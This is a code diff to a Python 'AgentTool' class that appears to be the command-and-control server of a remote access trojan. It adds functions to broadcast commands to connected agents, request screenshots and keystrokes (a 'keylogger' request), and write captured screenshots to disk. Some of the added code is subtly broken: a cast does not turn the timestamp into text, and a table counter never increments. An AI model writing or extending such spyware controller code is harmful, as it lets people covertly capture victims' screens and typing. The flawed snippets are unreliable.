@@ -1,4 +1,3 @@
-import typing
 from agent import Agent
 from socket import socket
 import base64
@@ -6,7 +5,7 @@ from logger import get_logger
 from Crypto.Cipher import PKCS1_OAEP
 import msgpack
 from typing import cast
-
+from datetime import datetime
 from globals import AGENTS_JSON, ENCODING, RECV_SIZE, TLS_ENABLED
 
 logger = get_logger()
@@ -36,18 +35,25 @@ class AgentTool:
             if agent.addr == rhost:
                 return agent
 
+    def get_agent_by_index(self, index: int) -> Agent:
+        """Return an agent with given index number"""
+        return self.agents[index]
+
     def print_agents_table(self):
-        """Agents table
-        TO-DO
+        """
+        Agents table
+        """
+        i = 0
+        for agent in self.agents:
+            print(f"{i} | {agent.addr}")
+
+    def broadcast_msg(self, data: bytes) -> None:
+        """
+        Send message to all agents
         """
         for agent in self.agents:
-            print(agent)
-
-    def broadcast_msg(self):
-        """Send message to all agents
-        TO-DO
-        """
-        pass
+            agent.socket.sendall(data)
+            logger.debug(f"Broadcast message sent to {agent.addr}")
 
     def send_str(self, agent: Agent, msg: str) -> None:
         """Send message to an agent"""
@@ -64,27 +70,51 @@ class AgentTool:
             self.send_str(socket, msg)
 
     def send_bytes(self, agent: Agent, data: bytes) -> None:
+        """Send bytes to an agent"""
         socket = agent.socket
         socket.sendall(data)
 
+    def generate_msgpack_from_dict(self, dictionary: dict) -> bytes:
+        """Gets dictionary and returns msgpack bytes"""
+        return cast(bytes, msgpack.dumps(dictionary))
+
     def request_screenshoot(self, agent: Agent) -> None:
-        request = {
-            "type": "screenshoot"
-        }
-        msg: bytes = cast(bytes, msgpack.dumps(request))
+        """Request screenshoot from a client"""
+        request = {"type": "screenshoot"}
+        msg = self.generate_msgpack_from_dict(request)
         self.send_bytes(agent=agent, data=msg)
 
-    # connection handler
+    def handle_screenshoot(self, data: bytes) -> str:
+        """Gets bytes data and write into image file"""
+        filename = cast(str, datetime.now().timestamp()) + ".jpg"
+        with open(filename, "wb") as f:
+            f.write(data)
+        return filename
 
-    def handle_client(self, client_socket: socket,
-                      addr,
-                      rsa_chipher: PKCS1_OAEP.PKCS1OAEP_Cipher | None,
-                      encoding: str = ENCODING,
-                      recv_size: int = RECV_SIZE,
-                      tls_enabled: bool | str = TLS_ENABLED,
-                      agents_json: str = AGENTS_JSON,
-                      logger=get_logger(),
-                      ) -> None:
+    def request_keystrokes(self, agent: Agent) -> None:
+        request = {"type": "keylogger"}
+        msg = self.generate_msgpack_from_dict(request)
+        self.send_bytes(agent, msg)
+
+    def add_role_to_agent(self, role: str, agent: Agent) -> list[str]:
+        if role not in agent.roles:
+            agent.roles.append(role)
+        else:
+            logger.info(f"{role} is already assigned to {agent.addr}")
+        return agent.roles
+
+    # connection handler
+    def handle_client(
+        self,
+        client_socket: socket,
+        addr,
+        rsa_chipher: PKCS1_OAEP.PKCS1OAEP_Cipher | None,
+        encoding: str = ENCODING,
+        recv_size: int = RECV_SIZE,
+        tls_enabled: bool | str = TLS_ENABLED,
+        agents_json: str = AGENTS_JSON,
+        logger=get_logger(),
+    ) -> None:
         logger.info(f"\nConnection from {addr}")
         agent = Agent(str(addr), ["agent"], agents_json, socket=client_socket)
 
@@ -102,8 +132,7 @@ class AgentTool:
                     try:
                         decrypted = rsa_chipher.decrypt(base64.b64decode(data))
                         logger.debug(f"decrypted={decrypted}")
-                        deserialized_data: list = cast(
-                            list, msgpack.loads(decrypted))
+                        deserialized_data: list = cast(list, msgpack.loads(decrypted))
                         logger.debug(f"deserialized_data={deserialized_data}")
                         message_dict: dict = deserialized_data[0]
                         message: str = message_dict["content"]
